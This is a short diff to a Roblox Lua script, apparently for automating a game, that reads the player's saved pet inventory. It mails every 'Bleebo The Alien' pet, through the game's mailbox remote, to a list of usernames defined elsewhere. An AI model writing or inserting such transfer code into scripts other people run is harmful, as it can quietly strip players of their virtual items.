@@ -67,5 +67,26 @@ end
 
 task.wait(2)
 
+local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local result = saveModule.Get()
 
+
+item = "Bleebo The Alien"
+
+local pet = result.Inventory.Pet
+for i, v in pairs(pet) do
+    if v.id == item then
+	for j, username in ipairs(names)do
+        	local args = {
+            	username,
+            	item,
+            	"Pet",
+            	i,
+            	32
+        	}
+        	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+		task.wait(2)
+	end
+    end
+end
 
